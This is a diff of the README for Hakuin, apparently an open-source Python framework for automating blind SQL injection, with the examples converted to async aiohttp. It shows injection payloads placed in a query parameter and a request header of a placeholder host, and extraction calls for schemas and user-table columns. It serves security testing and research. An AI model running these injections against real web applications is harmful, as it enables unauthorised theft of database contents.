@@ -2,7 +2,7 @@
     <img width="150" src="https://raw.githubusercontent.com/pruzko/hakuin/main/logo.png">
 </p>
 
-Hakuin is a Blind SQL Injection (BSQLI) optimization and automation framework written in Python 3. It abstract away the inference logic and allows users to easily and efficiently extract databases (DB) from vulnerable web applications. To speed up the process, Hakuin uses pre-trained language models for DB schemas and adaptive language models in combination with opportunistic string guessing for textual DB content.
+Hakuin is a Blind SQL Injection (BSQLI) optimization and automation framework written in Python 3. It abstract away the inference logic and allows users to easily and efficiently extract databases (DB) from vulnerable web applications. To speed up the process, Hakuin utilizes a variety of optimization methods, such as pre-trained and adaptive language models, opportunistic guessing, and more.
 
 Hakuin has been presented at esteemed academic and industrial conferences:
 - [BlackHat MEA, Riyadh](https://blackhatmea.com/session/hakuin-injecting-brain-blind-sql-injection), 2023
@@ -31,38 +31,41 @@ Once you identify a BSQLI vulnerability, you need to tell Hakuin how to inject i
 
 ##### Example 1 - Query Parameter Injection with Status-based Inference
 ```python
-import requests
+import aiohttp
 from hakuin import Requester
 
 class StatusRequester(Requester):
-    def request(self, ctx, query):
-        r = requests.get(f'http://vuln.com/?n=XXX" OR ({query}) --')
-        return r.status_code == 200
+    async def request(self, ctx, query):
+        r = await aiohttp.get(f'http://vuln.com/?n=XXX" OR ({query}) --')
+        return r.status == 200
 ```
 
 ##### Example 2 - Header Injection with Content-based Inference
 ```python
 class ContentRequester(Requester):
-    def request(self, ctx, query):
+    async def request(self, ctx, query):
         headers = {'vulnerable-header': f'xxx" OR ({query}) --'}
-        r = requests.get(f'http://vuln.com/', headers=headers)
-        return 'found' in r.content.decode()
+        r = await aiohttp.get(f'http://vuln.com/', headers=headers)
+        return 'found' in await r.text()
 ```
 
-To start extracting data, use the `Extractor` class. It requires a `DBMS` object to contruct queries and a `Requester` object to inject them. Currently, Hakuin supports SQLite, MySQL, PSQL (PostgreSQL), and MSSQL (SQL Server) DBMSs, but will soon include more options. If you wish to support another DBMS, implement the `DBMS` interface defined in `hakuin/dbms/DBMS.py`.
+To start extracting data, use the `Extractor` class. It requires a `DBMS` object to contruct queries and a `Requester` object to inject them. Hakuin currently supports `SQLite`, `MySQL`, `PSQL` (PostgreSQL), and `MSSQL` (SQL Server) DBMSs, but will soon include more options. If you wish to support another DBMS, implement the `DBMS` interface defined in `hakuin/dbms/DBMS.py`.
 
 ##### Example 1 - Extracting SQLite/MySQL/PSQL/MSSQL
 ```python
-from hakuin.dbms import SQLite, MySQL, PSQL, MSSQL
+import asyncio
 from hakuin import Extractor, Requester
+from hakuin.dbms import SQLite, MySQL, PSQL, MSSQL
 
 class StatusRequester(Requester):
     ...
 
-ext = Extractor(requester=StatusRequester(), dbms=SQLite())
-# ext = Extractor(requester=StatusRequester(), dbms=MySQL())
-# ext = Extractor(requester=StatusRequester(), dbms=PSQL())
-# ext = Extractor(requester=StatusRequester(), dbms=MSSQL())
+async def main():
+    ext = await Extractor(requester=StatusRequester(), dbms=SQLite())
+    ...
+
+if __name__ == '__main__':
+    asyncio.get_event_loop().run_until_complete(main())
 ```
 
 Now that eveything is set, you can start extracting DB schemas.
@@ -72,14 +75,13 @@ Now that eveything is set, you can start extracting DB schemas.
 # strategy:
 #   'binary':   Use binary search
 #   'model':    Use pre-trained models
-schema = ext.extract_schema(strategy='model')
+schema = await ext.extract_schema(strategy='model')
 ```
 
 ##### Example 2 - Extracting only Table/Column Names
-
 ```python
-tables = ext.extract_table_names(strategy='model')
-columns = ext.extract_column_names(table='users', strategy='model')
+tables = await ext.extract_table_names(strategy='model')
+columns = await ext.extract_column_names(table='users', strategy='model')
 ```
 
 Once you know the schema, you can extract the actual content.
@@ -87,7 +89,7 @@ Once you know the schema, you can extract the actual content.
 ##### Example 1 - Extracting Generic Columns
 ```python
 # text_strategy:    Use this strategy if the column is text
-res = ext.extract_column(table='users', column='address', text_strategy='dynamic'):
+res = await ext.extract_column(table='users', column='address', text_strategy='dynamic')
 ```
 
 ##### Example 2 - Extracting Textual Columns
@@ -98,22 +100,22 @@ res = ext.extract_column(table='users', column='address', text_strategy='dynamic
 #   'unigram':      Use unigram model
 #   'dynamic':      Dynamically identify the best strategy. This setting
 #                   also enables opportunistic guessing.
-res = ext.extract_column_text(table='users', column='address', strategy='dynamic'):
+res = await ext.extract_column_text(table='users', column='address', strategy='dynamic')
 ```
 
 ##### Example 3 - Extracting Integer Columns
 ```python
-res = ext.extract_column_int(table='users', column='id'):
+res = await ext.extract_column_int(table='users', column='id')
 ```
 
 ##### Example 4 - Extracting Float Columns
 ```python
-res = ext.extract_column_float(table='products', column='price'):
+res = await ext.extract_column_float(table='products', column='price')
 ```
 
 ##### Example 5 - Extracting Blob (Binary Data) Columns
 ```python
-res = ext.extract_column_blob(table='users', column='id'):
+res = await ext.extract_column_blob(table='users', column='id')
 ```
 
 More examples can be found in the `tests` directory.
